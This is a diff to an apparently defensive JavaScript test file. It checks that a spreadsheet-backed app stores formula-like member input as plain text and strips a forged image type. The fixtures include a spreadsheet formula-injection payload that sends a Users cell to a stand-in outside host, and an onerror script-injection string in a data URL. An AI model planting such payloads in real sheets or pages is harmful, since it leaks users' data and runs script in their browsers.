@@ -188,4 +188,30 @@ const MIN = 60000, HOUR = 60 * MIN, DAY = 24 * HOUR;
   check("…and an unknown page or a path in the file name made harmless", log[1] === "other passwd:0 boom", log[1]);
 }
 
+// text that looks like a formula, going into the master book (API 62): kept as text everywhere, so "=Users!E2" in an
+// atlas correction can't show the public what the Users tab holds
+{
+  const F = "=Users!E2", gas = H({ Ark1: [HEAD] }, { settings: { SOCIAL: "on", SIGNUP_CODE: "c" } });
+  const a = gas.call({ action: "signup", email: "=IMAGE(\"//x.io/\"&Users!E2)@x.io", user: "eve", code: "c", ...keys("eve", "pw") });
+  const as = p => gas.call({ user: "eve", token: a.token, ...p });
+  const e = as({ action: "atlasedit", edit: { climat: "les_amoureuses", producer: F, note: "+" + F } });
+  as({ action: "feedpost", entry: { producer: F, wine: "@x", region: "-" + F, note: F, to: F, vintage: "=1+1" } });
+  const post = (as({ action: "feed" }).feed || [])[0] || {};
+  as({ action: "feedcomment", id: post.id, text: F });
+  for (let i = 0; i < 5; i++) gas.call({ action: "login", user: F, auth: B64("guess" + i) });
+  gas.run("addInvites(1, '=1+1')");
+  const formulas = ["Users", "AtlasEdits", "Feed", "FeedComments", "Log", "Invites"].filter(t => gas.sheet(t) && gas.sheet(t)._formulas.length);
+  check("a member's text that looks like a formula is never a formula in the master book", a.ok && e.ok && post.id && !formulas.length, formulas.join(", "));
+  check("…and comes back exactly as written", (e.edits || []).some(x => x.producer === F && x.note === "+" + F) && post.producer === F && post.note === F
+    && gas.rows("Log").some(r => r[1] === "lockout" && r[2] === F), JSON.stringify(e.edits));
+}
+// a photo's type goes back into a data: URL, so only an image type is kept
+{
+  const gas = H({ Ark1: [HEAD] }, { settings: { SOCIAL: "on", SIGNUP_CODE: "c" } });
+  const a = signup(gas, "pia", "c"), as = p => gas.call({ user: "pia", token: a.token, ...p });
+  as({ action: "feedpost", entry: { note: "pic", photo: 'data:image/png" onerror="alert(1);base64,' + Buffer.from("png").toString("base64") } });
+  const post = (as({ action: "feed" }).feed || [])[0] || {}, ph = as({ action: "photo", id: post.photo });
+  check("a photo sent with a made-up type is kept as an image/jpeg", ph.ok && /^data:image\/jpeg;base64,/.test(ph.photo || ""), JSON.stringify(ph).slice(0, 200));
+}
+
 const n = results.filter(Boolean).length; console.log(`\n${n}/${results.length} passed`); process.exit(n === results.length ? 0 : 1);
